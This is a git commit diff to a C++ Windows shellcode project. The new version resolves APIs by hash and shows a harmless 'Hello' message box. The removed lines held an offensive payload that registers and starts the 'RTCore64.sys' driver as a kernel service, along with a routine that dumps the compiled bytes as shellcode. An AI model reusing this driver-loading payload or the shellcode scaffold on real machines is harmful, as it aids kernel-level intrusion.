c5b6f27759d7de612988dc215582bae1aaa02a7c
hid3rx <hid3rx@hotmail.com>
2022-12-14 23:06:08 +0800

    修改shellcode生成参数

--- Shellcode/main.cpp
+++ Shellcode/main.cpp
@@ -1,17 +1,5 @@
 #include <Windows.h>
 #include <winternl.h>
-#include <stdio.h>
-
-
-/*
-* 编译说明：
-* 
-* 编译器务必使用Clang
-* 配置属性 -> C/C++ -> 优化 -> 优化 -> 最大优化(优选大小)(/O1)
-* 配置属性 -> C/C++ -> 代码生成 -> 安全检查 -> 禁用安全检查
-* 配置属性 -> C/C++ -> 命令行 -> 其他选项 -> -mno-sse
-*/
-
 
 /*
 * 函数哈希
@@ -72,13 +60,14 @@ __forceinline DWORD HashKey(CHAR* key) {
 * 函数声明
 */
 
-HMODULE GetKernel32Base();
+VOID Shellcode();
 PVOID GetProcAddrByHash(HMODULE Module, DWORD Hash);
 
 /*
 * Shellcode 实现
 */
 
+#pragma code_seg(push, ".text$00")
 VOID Shellcode() {
 
     //
@@ -88,27 +77,11 @@ VOID Shellcode() {
     typedef FARPROC(WINAPI* pfnGetProcAddress)(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
     typedef VOID(WINAPI* pfnExitThread)(_In_ DWORD dwExitCode);
 
-    typedef SC_HANDLE(WINAPI* pfnOpenSCManagerA)(_In_opt_ LPCSTR lpMachineName, _In_opt_ LPCSTR lpDatabaseName, _In_ DWORD dwDesiredAccess);
-    typedef SC_HANDLE(WINAPI* pfnCreateServiceA)(
-        _In_        SC_HANDLE    hSCManager,
-        _In_        LPCSTR     lpServiceName,
-        _In_opt_    LPCSTR     lpDisplayName,
-        _In_        DWORD        dwDesiredAccess,
-        _In_        DWORD        dwServiceType,
-        _In_        DWORD        dwStartType,
-        _In_        DWORD        dwErrorControl,
-        _In_opt_    LPCSTR     lpBinaryPathName,
-        _In_opt_    LPCSTR     lpLoadOrderGroup,
-        _Out_opt_   LPDWORD      lpdwTagId,
-        _In_opt_    LPCSTR     lpDependencies,
-        _In_opt_    LPCSTR     lpServiceStartName,
-        _In_opt_    LPCSTR     lpPassword
-        );
-    typedef BOOL(WINAPI* pfnStartServiceA)(
-        _In_            SC_HANDLE            hService,
-        _In_            DWORD                dwNumServiceArgs,
-        _In_reads_opt_(dwNumServiceArgs) LPCSTR* lpServiceArgVectors);
-    typedef BOOL(WINAPI* pfnCloseServiceHandle)(_In_ SC_HANDLE hSCObject);
+    typedef int (WINAPI* pfnMessageBoxA)(
+        _In_opt_ HWND hWnd,
+        _In_opt_ LPCSTR lpText,
+        _In_opt_ LPCSTR lpCaption,
+        _In_ UINT uType);
 
     //
     // 变量声明
@@ -126,88 +99,31 @@ VOID Shellcode() {
     GetProcAddress = (pfnGetProcAddress)GetProcAddrByHash(Kernel32, HASH_GetProcAddress);
 
     // 获取 ExitThread 函数
-    BYTE aExitThread[] = { "ExitThread" };
-    pfnExitThread ExitThread = (pfnExitThread)GetProcAddress(Kernel32, (LPCSTR)aExitThread);
+    pfnExitThread ExitThread = (pfnExitThread)GetProcAddress(Kernel32, "ExitThread");
 
-    // 载入 Advapi32 模块
-    BYTE ModuleName[] = { "Advapi32.dll" };
-    HMODULE Advapi32 = LoadLibraryA((LPCSTR)ModuleName);
-    if (Advapi32 == NULL) {
+    // 载入 User32.dll 模块
+    HMODULE User32 = LoadLibraryA("User32.dll");
+    if (User32 == NULL) {
         ExitThread(0);
         return;
     }
 
-    // 获取 OpenSCManagerA 函数
-    BYTE aOpenSCManagerA[] = { "OpenSCManagerA" };
-    pfnOpenSCManagerA OpenSCManagerA = (pfnOpenSCManagerA)GetProcAddress(Advapi32, (LPCSTR)aOpenSCManagerA);
-    if (OpenSCManagerA == NULL) {
+    // 获取 MessageBoxA 函数
+    pfnMessageBoxA MessageBoxA = (pfnMessageBoxA)GetProcAddress(User32, "MessageBoxA");
+    if (MessageBoxA == NULL) {
         ExitThread(0);
         return;
     }
 
-    // 获取 CreateServiceA 函数
-    BYTE aCreateServiceA[] = { "CreateServiceA" };
-    pfnCreateServiceA CreateServiceA = (pfnCreateServiceA)GetProcAddress(Advapi32, (LPCSTR)aCreateServiceA);
-    if (CreateServiceA == NULL) {
-        ExitThread(0);
-        return;
-    }
+    // 弹框
+    MessageBoxA(NULL, "Hello", "Message", MB_OK);
 
-    // 获取 StartServiceA 函数
-    BYTE aStartServiceA[] = { "StartServiceA" };
-    pfnStartServiceA StartServiceA = (pfnStartServiceA)GetProcAddress(Advapi32, (LPCSTR)aStartServiceA);
-    if (StartServiceA == NULL) {
-        ExitThread(0);
-        return;
-    }
-
-    // 获取 CloseServiceHandle 函数
-    BYTE aCloseServiceHandle[] = { "CloseServiceHandle" };
-    pfnCloseServiceHandle CloseServiceHandle = (pfnCloseServiceHandle)GetProcAddress(Advapi32, (LPCSTR)aCloseServiceHandle);
-    if (CloseServiceHandle == NULL) {
-        ExitThread(0);
-        return;
-    }
-
-    // 创建服务
-    SC_HANDLE SCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-    if (SCManager == NULL) {
-        ExitThread(0);
-        return;
-    }
-
-    BYTE aServiceName[] = { "RTCore64" };
-    BYTE aPath[] = { "C:\\RTCore64\\RTCore64.sys" };
-    SC_HANDLE Service = CreateServiceA(
-        SCManager,
-        (LPCSTR)aServiceName,
-        (LPCSTR)aServiceName,
-        SERVICE_ALL_ACCESS,
-        SERVICE_KERNEL_DRIVER,
-        SERVICE_DEMAND_START,
-        SERVICE_ERROR_NORMAL,
-        (LPCSTR)aPath,
-        NULL,
-        NULL,
-        NULL,
-        NULL,
-        NULL);
-    
-    if (Service == NULL) {
-        CloseServiceHandle(SCManager);
-        ExitThread(0);
-        return;
-    }
-
-    // 启动服务
-    StartServiceA(Service, 0, NULL);
-
-    // 清理
-    CloseServiceHandle(SCManager);
-    CloseServiceHandle(Service);
+    // 退出线程
     ExitThread(0);
 }
+#pragma code_seg(pop)
 
+#pragma code_seg(push, ".text$01")
 PVOID GetProcAddrByHash(HMODULE Module, DWORD Hash) {
 
     PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)Module;
@@ -232,25 +148,4 @@ PVOID GetProcAddrByHash(HMODULE Module, DWORD Hash) {
 
     return NULL;
 }
-
-VOID End() {
-    return;
-}
-
-int main() {
-
-    INT Size = (UINT_PTR)End - (UINT_PTR)Shellcode;
-    BYTE* Buffer = (BYTE*)Shellcode;
-
-    printf("\"");
-    for (int i = 0; i < Size; i++) {
-
-        if (i != 0 && (i % 16) == 0)
-            printf("\"\n\"");
-
-        printf("\\x%.2X", Buffer[i]);
-    }
-    printf("\"");
-
-    return 0;
-}
+#pragma code_seg(pop)
